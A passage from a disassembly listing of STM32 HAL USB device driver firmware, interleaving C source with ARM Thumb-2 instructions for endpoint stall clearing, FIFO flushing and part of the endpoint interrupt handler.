 80023e2:	4413      	add	r3, r2
 80023e4:	00db      	lsls	r3, r3, #3
 80023e6:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023ea:	687a      	ldr	r2, [r7, #4]
 80023ec:	4413      	add	r3, r2
 80023ee:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023f0:	68fb      	ldr	r3, [r7, #12]
 80023f2:	2200      	movs	r2, #0
 80023f4:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 80023f6:	68fb      	ldr	r3, [r7, #12]
 80023f8:	2200      	movs	r2, #0
 80023fa:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80023fc:	78fb      	ldrb	r3, [r7, #3]
 80023fe:	f003 0307 	and.w	r3, r3, #7
 8002402:	b2da      	uxtb	r2, r3
 8002404:	68fb      	ldr	r3, [r7, #12]
 8002406:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002408:	687b      	ldr	r3, [r7, #4]
 800240a:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800240e:	2b01      	cmp	r3, #1
 8002410:	d101      	bne.n	8002416 <HAL_PCD_EP_ClrStall+0x82>
 8002412:	2302      	movs	r3, #2
 8002414:	e00e      	b.n	8002434 <HAL_PCD_EP_ClrStall+0xa0>
 8002416:	687b      	ldr	r3, [r7, #4]
 8002418:	2201      	movs	r2, #1
 800241a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 800241e:	687b      	ldr	r3, [r7, #4]
 8002420:	681b      	ldr	r3, [r3, #0]
 8002422:	68f9      	ldr	r1, [r7, #12]
 8002424:	4618      	mov	r0, r3
 8002426:	f005 feaa 	bl	800817e <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 800242a:	687b      	ldr	r3, [r7, #4]
 800242c:	2200      	movs	r2, #0
 800242e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002432:	2300      	movs	r3, #0
}
 8002434:	4618      	mov	r0, r3
 8002436:	3710      	adds	r7, #16
 8002438:	46bd      	mov	sp, r7
 800243a:	bd80      	pop	{r7, pc}

0800243c <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800243c:	b580      	push	{r7, lr}
 800243e:	b082      	sub	sp, #8
 8002440:	af00      	add	r7, sp, #0
 8002442:	6078      	str	r0, [r7, #4]
 8002444:	460b      	mov	r3, r1
 8002446:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 8002448:	687b      	ldr	r3, [r7, #4]
 800244a:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800244e:	2b01      	cmp	r3, #1
 8002450:	d101      	bne.n	8002456 <HAL_PCD_EP_Flush+0x1a>
 8002452:	2302      	movs	r3, #2
 8002454:	e01b      	b.n	800248e <HAL_PCD_EP_Flush+0x52>
 8002456:	687b      	ldr	r3, [r7, #4]
 8002458:	2201      	movs	r2, #1
 800245a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 800245e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002462:	2b00      	cmp	r3, #0
 8002464:	da09      	bge.n	800247a <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 8002466:	687b      	ldr	r3, [r7, #4]
 8002468:	681a      	ldr	r2, [r3, #0]
 800246a:	78fb      	ldrb	r3, [r7, #3]
 800246c:	f003 0307 	and.w	r3, r3, #7
 8002470:	4619      	mov	r1, r3
 8002472:	4610      	mov	r0, r2
 8002474:	f003 fcb8 	bl	8005de8 <USB_FlushTxFifo>
 8002478:	e004      	b.n	8002484 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 800247a:	687b      	ldr	r3, [r7, #4]
 800247c:	681b      	ldr	r3, [r3, #0]
 800247e:	4618      	mov	r0, r3
 8002480:	f003 fcbe 	bl	8005e00 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 8002484:	687b      	ldr	r3, [r7, #4]
 8002486:	2200      	movs	r2, #0
 8002488:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800248c:	2300      	movs	r3, #0
}
 800248e:	4618      	mov	r0, r3
 8002490:	3708      	adds	r7, #8
 8002492:	46bd      	mov	sp, r7
 8002494:	bd80      	pop	{r7, pc}

08002496 <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 8002496:	b580      	push	{r7, lr}
 8002498:	b096      	sub	sp, #88	; 0x58
 800249a:	af00      	add	r7, sp, #0
 800249c:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 800249e:	e3b1      	b.n	8002c04 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 80024a0:	687b      	ldr	r3, [r7, #4]
 80024a2:	681b      	ldr	r3, [r3, #0]
 80024a4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80024a8:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 80024ac:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80024b0:	b2db      	uxtb	r3, r3
 80024b2:	f003 030f 	and.w	r3, r3, #15
 80024b6:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 80024ba:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80024be:	2b00      	cmp	r3, #0
 80024c0:	f040 8173 	bne.w	80027aa <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 80024c4:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80024c8:	f003 0310 	and.w	r3, r3, #16
 80024cc:	2b00      	cmp	r3, #0
 80024ce:	d150      	bne.n	8002572 <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80024d0:	687b      	ldr	r3, [r7, #4]
 80024d2:	681b      	ldr	r3, [r3, #0]
 80024d4:	881b      	ldrh	r3, [r3, #0]
 80024d6:	b29b      	uxth	r3, r3
 80024d8:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 80024dc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80024e0:	81fb      	strh	r3, [r7, #14]
 80024e2:	687b      	ldr	r3, [r7, #4]
 80024e4:	681a      	ldr	r2, [r3, #0]
 80024e6:	89fb      	ldrh	r3, [r7, #14]
 80024e8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80024ec:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80024f0:	b29b      	uxth	r3, r3
 80024f2:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 80024f4:	687b      	ldr	r3, [r7, #4]
 80024f6:	3328      	adds	r3, #40	; 0x28
 80024f8:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 80024fa:	687b      	ldr	r3, [r7, #4]
 80024fc:	681b      	ldr	r3, [r3, #0]
 80024fe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002502:	b29b      	uxth	r3, r3
 8002504:	461a      	mov	r2, r3
 8002506:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002508:	781b      	ldrb	r3, [r3, #0]
 800250a:	00db      	lsls	r3, r3, #3
 800250c:	4413      	add	r3, r2
 800250e:	687a      	ldr	r2, [r7, #4]
 8002510:	6812      	ldr	r2, [r2, #0]
 8002512:	4413      	add	r3, r2
 8002514:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002518:	881b      	ldrh	r3, [r3, #0]
 800251a:	f3c3 0209 	ubfx	r2, r3, #0, #10
 800251e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002520:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 8002522:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002524:	695a      	ldr	r2, [r3, #20]
 8002526:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002528:	69db      	ldr	r3, [r3, #28]
 800252a:	441a      	add	r2, r3
 800252c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800252e:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 8002530:	2100      	movs	r1, #0
 8002532:	6878      	ldr	r0, [r7, #4]
 8002534:	f00a f98f 	bl	800c856 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 8002538:	687b      	ldr	r3, [r7, #4]
 800253a:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800253e:	b2db      	uxtb	r3, r3
 8002540:	2b00      	cmp	r3, #0
 8002542:	f000 835f 	beq.w	8002c04 <PCD_EP_ISR_Handler+0x76e>
 8002546:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002548:	699b      	ldr	r3, [r3, #24]
 800254a:	2b00      	cmp	r3, #0
 800254c:	f040 835a 	bne.w	8002c04 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 8002550:	687b      	ldr	r3, [r7, #4]
 8002552:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8002556:	b2db      	uxtb	r3, r3
 8002558:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800255c:	b2da      	uxtb	r2, r3
 800255e:	687b      	ldr	r3, [r7, #4]
 8002560:	681b      	ldr	r3, [r3, #0]
 8002562:	b292      	uxth	r2, r2
 8002564:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 8002568:	687b      	ldr	r3, [r7, #4]
 800256a:	2200      	movs	r2, #0
 800256c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8002570:	e348      	b.n	8002c04 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 8002572:	687b      	ldr	r3, [r7, #4]
 8002574:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002578:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 800257a:	687b      	ldr	r3, [r7, #4]
 800257c:	681b      	ldr	r3, [r3, #0]
 800257e:	881b      	ldrh	r3, [r3, #0]
 8002580:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 8002584:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002588:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800258c:	2b00      	cmp	r3, #0
 800258e:	d032      	beq.n	80025f6 <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002590:	687b      	ldr	r3, [r7, #4]
 8002592:	681b      	ldr	r3, [r3, #0]
 8002594:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002598:	b29b      	uxth	r3, r3
 800259a:	461a      	mov	r2, r3
 800259c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800259e:	781b      	ldrb	r3, [r3, #0]
 80025a0:	00db      	lsls	r3, r3, #3
 80025a2:	4413      	add	r3, r2
 80025a4:	687a      	ldr	r2, [r7, #4]
 80025a6:	6812      	ldr	r2, [r2, #0]
 80025a8:	4413      	add	r3, r2
 80025aa:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80025ae:	881b      	ldrh	r3, [r3, #0]
 80025b0:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80025b4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025b6:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80025b8:	687b      	ldr	r3, [r7, #4]
 80025ba:	6818      	ldr	r0, [r3, #0]
 80025bc:	687b      	ldr	r3, [r7, #4]
 80025be:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 80025c2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025c4:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 80025c6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025c8:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80025ca:	b29b      	uxth	r3, r3
 80025cc:	f005 ff23 	bl	8008416 <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80025d0:	687b      	ldr	r3, [r7, #4]
 80025d2:	681b      	ldr	r3, [r3, #0]
 80025d4:	881b      	ldrh	r3, [r3, #0]
 80025d6:	b29a      	uxth	r2, r3
 80025d8:	f640 738f 	movw	r3, #3983	; 0xf8f
 80025dc:	4013      	ands	r3, r2
 80025de:	823b      	strh	r3, [r7, #16]
 80025e0:	687b      	ldr	r3, [r7, #4]
 80025e2:	681b      	ldr	r3, [r3, #0]
 80025e4:	8a3a      	ldrh	r2, [r7, #16]
 80025e6:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80025ea:	b292      	uxth	r2, r2
 80025ec:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 80025ee:	6878      	ldr	r0, [r7, #4]
 80025f0:	f00a f904 	bl	800c7fc <HAL_PCD_SetupStageCallback>
 80025f4:	e306      	b.n	8002c04 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 80025f6:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 80025fa:	2b00      	cmp	r3, #0
 80025fc:	f280 8302 	bge.w	8002c04 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002600:	687b      	ldr	r3, [r7, #4]
 8002602:	681b      	ldr	r3, [r3, #0]
 8002604:	881b      	ldrh	r3, [r3, #0]
 8002606:	b29a      	uxth	r2, r3
 8002608:	f640 738f 	movw	r3, #3983	; 0xf8f
 800260c:	4013      	ands	r3, r2
 800260e:	83fb      	strh	r3, [r7, #30]
 8002610:	687b      	ldr	r3, [r7, #4]
 8002612:	681b      	ldr	r3, [r3, #0]
 8002614:	8bfa      	ldrh	r2, [r7, #30]
 8002616:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800261a:	b292      	uxth	r2, r2
 800261c:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 800261e:	687b      	ldr	r3, [r7, #4]
 8002620:	681b      	ldr	r3, [r3, #0]
 8002622:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002626:	b29b      	uxth	r3, r3
 8002628:	461a      	mov	r2, r3
 800262a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800262c:	781b      	ldrb	r3, [r3, #0]
 800262e:	00db      	lsls	r3, r3, #3
 8002630:	4413      	add	r3, r2
 8002632:	687a      	ldr	r2, [r7, #4]
 8002634:	6812      	ldr	r2, [r2, #0]
 8002636:	4413      	add	r3, r2
 8002638:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800263c:	881b      	ldrh	r3, [r3, #0]
 800263e:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002642:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002644:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 8002646:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002648:	69db      	ldr	r3, [r3, #28]
 800264a:	2b00      	cmp	r3, #0
 800264c:	d019      	beq.n	8002682 <PCD_EP_ISR_Handler+0x1ec>
 800264e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002650:	695b      	ldr	r3, [r3, #20]
 8002652:	2b00      	cmp	r3, #0
 8002654:	d015      	beq.n	8002682 <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002656:	687b      	ldr	r3, [r7, #4]
 8002658:	6818      	ldr	r0, [r3, #0]
 800265a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800265c:	6959      	ldr	r1, [r3, #20]
 800265e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002660:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 8002662:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002664:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002666:	b29b      	uxth	r3, r3
 8002668:	f005 fed5 	bl	8008416 <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 800266c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800266e:	695a      	ldr	r2, [r3, #20]
 8002670:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002672:	69db      	ldr	r3, [r3, #28]
 8002674:	441a      	add	r2, r3
 8002676:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002678:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 800267a:	2100      	movs	r1, #0
 800267c:	6878      	ldr	r0, [r7, #4]
 800267e:	f00a f8cf 	bl	800c820 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002682:	687b      	ldr	r3, [r7, #4]
 8002684:	681b      	ldr	r3, [r3, #0]
 8002686:	881b      	ldrh	r3, [r3, #0]
 8002688:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 800268c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002690:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002694:	2b00      	cmp	r3, #0
 8002696:	f040 82b5 	bne.w	8002c04 <PCD_EP_ISR_Handler+0x76e>
 800269a:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800269e:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 80026a2:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 80026a6:	f000 82ad 	beq.w	8002c04 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 80026aa:	687b      	ldr	r3, [r7, #4]
 80026ac:	681b      	ldr	r3, [r3, #0]
 80026ae:	61bb      	str	r3, [r7, #24]
 80026b0:	687b      	ldr	r3, [r7, #4]
 80026b2:	681b      	ldr	r3, [r3, #0]
 80026b4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80026b8:	b29b      	uxth	r3, r3
 80026ba:	461a      	mov	r2, r3
 80026bc:	69bb      	ldr	r3, [r7, #24]
 80026be:	4413      	add	r3, r2
 80026c0:	61bb      	str	r3, [r7, #24]
 80026c2:	69bb      	ldr	r3, [r7, #24]
 80026c4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80026c8:	617b      	str	r3, [r7, #20]
 80026ca:	697b      	ldr	r3, [r7, #20]
 80026cc:	881b      	ldrh	r3, [r3, #0]
 80026ce:	b29b      	uxth	r3, r3
 80026d0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80026d4:	b29a      	uxth	r2, r3
 80026d6:	697b      	ldr	r3, [r7, #20]
 80026d8:	801a      	strh	r2, [r3, #0]
 80026da:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026dc:	691b      	ldr	r3, [r3, #16]
 80026de:	2b3e      	cmp	r3, #62	; 0x3e
 80026e0:	d91d      	bls.n	800271e <PCD_EP_ISR_Handler+0x288>
 80026e2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026e4:	691b      	ldr	r3, [r3, #16]
 80026e6:	095b      	lsrs	r3, r3, #5
 80026e8:	647b      	str	r3, [r7, #68]	; 0x44
 80026ea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026ec:	691b      	ldr	r3, [r3, #16]
 80026ee:	f003 031f 	and.w	r3, r3, #31
 80026f2:	2b00      	cmp	r3, #0
 80026f4:	d102      	bne.n	80026fc <PCD_EP_ISR_Handler+0x266>
 80026f6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80026f8:	3b01      	subs	r3, #1
 80026fa:	647b      	str	r3, [r7, #68]	; 0x44
 80026fc:	697b      	ldr	r3, [r7, #20]
 80026fe:	881b      	ldrh	r3, [r3, #0]
 8002700:	b29a      	uxth	r2, r3
 8002702:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002704:	b29b      	uxth	r3, r3
 8002706:	029b      	lsls	r3, r3, #10
 8002708:	b29b      	uxth	r3, r3
 800270a:	4313      	orrs	r3, r2
 800270c:	b29b      	uxth	r3, r3
 800270e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002712:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002716:	b29a      	uxth	r2, r3
 8002718:	697b      	ldr	r3, [r7, #20]
 800271a:	801a      	strh	r2, [r3, #0]
 800271c:	e026      	b.n	800276c <PCD_EP_ISR_Handler+0x2d6>
 800271e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002720:	691b      	ldr	r3, [r3, #16]
 8002722:	2b00      	cmp	r3, #0
 8002724:	d10a      	bne.n	800273c <PCD_EP_ISR_Handler+0x2a6>
 8002726:	697b      	ldr	r3, [r7, #20]
 8002728:	881b      	ldrh	r3, [r3, #0]
 800272a:	b29b      	uxth	r3, r3
 800272c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002730:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002734:	b29a      	uxth	r2, r3
 8002736:	697b      	ldr	r3, [r7, #20]
 8002738:	801a      	strh	r2, [r3, #0]
 800273a:	e017      	b.n	800276c <PCD_EP_ISR_Handler+0x2d6>
 800273c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800273e:	691b      	ldr	r3, [r3, #16]
 8002740:	085b      	lsrs	r3, r3, #1
 8002742:	647b      	str	r3, [r7, #68]	; 0x44
 8002744:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002746:	691b      	ldr	r3, [r3, #16]
 8002748:	f003 0301 	and.w	r3, r3, #1
 800274c:	2b00      	cmp	r3, #0
 800274e:	d002      	beq.n	8002756 <PCD_EP_ISR_Handler+0x2c0>
 8002750:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002752:	3301      	adds	r3, #1
 8002754:	647b      	str	r3, [r7, #68]	; 0x44
 8002756:	697b      	ldr	r3, [r7, #20]
 8002758:	881b      	ldrh	r3, [r3, #0]
 800275a:	b29a      	uxth	r2, r3
 800275c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800275e:	b29b      	uxth	r3, r3
 8002760:	029b      	lsls	r3, r3, #10
 8002762:	b29b      	uxth	r3, r3
 8002764:	4313      	orrs	r3, r2
 8002766:	b29a      	uxth	r2, r3
 8002768:	697b      	ldr	r3, [r7, #20]
 800276a:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 800276c:	687b      	ldr	r3, [r7, #4]
 800276e:	681b      	ldr	r3, [r3, #0]
 8002770:	881b      	ldrh	r3, [r3, #0]
 8002772:	b29b      	uxth	r3, r3
 8002774:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002778:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800277c:	827b      	strh	r3, [r7, #18]
 800277e:	8a7b      	ldrh	r3, [r7, #18]
 8002780:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002784:	827b      	strh	r3, [r7, #18]
 8002786:	8a7b      	ldrh	r3, [r7, #18]
 8002788:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800278c:	827b      	strh	r3, [r7, #18]
 800278e:	687b      	ldr	r3, [r7, #4]
 8002790:	681a      	ldr	r2, [r3, #0]
 8002792:	8a7b      	ldrh	r3, [r7, #18]
 8002794:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002798:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800279c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80027a0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80027a4:	b29b      	uxth	r3, r3
 80027a6:	8013      	strh	r3, [r2, #0]
 80027a8:	e22c      	b.n	8002c04 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 80027aa:	687b      	ldr	r3, [r7, #4]
 80027ac:	681b      	ldr	r3, [r3, #0]
 80027ae:	461a      	mov	r2, r3
 80027b0:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80027b4:	009b      	lsls	r3, r3, #2
 80027b6:	4413      	add	r3, r2
 80027b8:	881b      	ldrh	r3, [r3, #0]
 80027ba:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 80027be:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 80027c2:	2b00      	cmp	r3, #0
 80027c4:	f280 80f6 	bge.w	80029b4 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 80027c8:	687b      	ldr	r3, [r7, #4]
 80027ca:	681b      	ldr	r3, [r3, #0]
 80027cc:	461a      	mov	r2, r3
 80027ce:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80027d2:	009b      	lsls	r3, r3, #2
 80027d4:	4413      	add	r3, r2
 80027d6:	881b      	ldrh	r3, [r3, #0]
 80027d8:	b29a      	uxth	r2, r3
 80027da:	f640 738f 	movw	r3, #3983	; 0xf8f
 80027de:	4013      	ands	r3, r2
 80027e0:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 80027e4:	687b      	ldr	r3, [r7, #4]
 80027e6:	681b      	ldr	r3, [r3, #0]
 80027e8:	461a      	mov	r2, r3
 80027ea:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80027ee:	009b      	lsls	r3, r3, #2
 80027f0:	4413      	add	r3, r2
 80027f2:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 80027f6:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80027fa:	b292      	uxth	r2, r2
 80027fc:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 80027fe:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 8002802:	4613      	mov	r3, r2
 8002804:	009b      	lsls	r3, r3, #2
 8002806:	4413      	add	r3, r2
 8002808:	00db      	lsls	r3, r3, #3
 800280a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800280e:	687a      	ldr	r2, [r7, #4]
 8002810:	4413      	add	r3, r2
 8002812:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 8002814:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002816:	7b1b      	ldrb	r3, [r3, #12]
 8002818:	2b00      	cmp	r3, #0
 800281a:	d123      	bne.n	8002864 <PCD_EP_ISR_Handler+0x3ce>
        {
